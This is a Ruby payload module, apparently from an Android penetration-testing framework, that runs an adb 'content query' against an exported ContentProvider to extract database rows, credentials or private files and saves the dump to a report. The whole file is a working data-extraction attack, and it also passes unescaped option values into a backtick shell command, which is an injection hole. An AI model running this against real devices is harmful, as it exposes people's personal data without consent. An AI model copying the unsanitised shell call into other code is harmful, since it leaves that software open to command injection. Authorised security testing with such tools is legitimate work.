require_relative '../../../core/payload_base'

module MPF
  module Payloads
    module Singles
      module Android
        class ProviderQuery < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android ContentProvider Query',
              module: 'payload/android/singles/provider_query',
              platform: :android,
              description: 'Queries exported ContentProvider to extract sensitive data. ' \
                          'Can enumerate database contents, extract credentials, or access private files.',
              authors: ['MPF Research Team'],
              severity: 'critical'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('PROVIDER_URI', 'ContentProvider URI', required: true)
            add_option('PROJECTION', 'Columns to query (comma-separated)', default: '*')
            add_option('SELECTION', 'WHERE clause', default: '')
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('OUTPUT_FILE', 'Save results to file', default: 'provider_dump.txt')
          end

          def generate(opts = {})
            uri = get_option('PROVIDER_URI')
            projection = get_option('PROJECTION')
            selection = get_option('SELECTION')
            device = get_option('DEVICE')

            # Build ADB content query command
            cmd = "adb -s #{device} shell content query --uri #{uri}"
            
            unless projection == '*'
              cmd += " --projection #{projection}"
            end
            
            unless selection.empty?
              cmd += " --where \"#{selection}\""
            end

            {
              type: 'adb_command',
              command: cmd,
              description: 'ContentProvider data extraction',
              impact: 'Extracts sensitive data from application database'
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            payload = generate
            
            print_status("Executing ContentProvider query...")
            print_status("URI: #{get_option('PROVIDER_URI')}")
            
            output = `#{payload[:command]} 2>&1`
            success = $?.success?

            if success && !output.include?('Error')
              print_good("Data extracted successfully")
              
              # Save to file
              output_file = get_option('OUTPUT_FILE')
              File.write("reports/payload/#{output_file}", output)
              
              # Parse results
              rows = output.scan(/Row: \d+/).length
              
              {
                success: true,
                output: output,
                rows_extracted: rows,
                saved_to: "reports/payload/#{output_file}",
                payload: payload,
                impact: "Extracted #{rows} rows of sensitive data - potential PII exposure"
              }
            else
              print_error("Query failed or provider not accessible")
              {
                success: false,
                output: output,
                error: 'ContentProvider query failed'
              }
            end
          end

          private

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
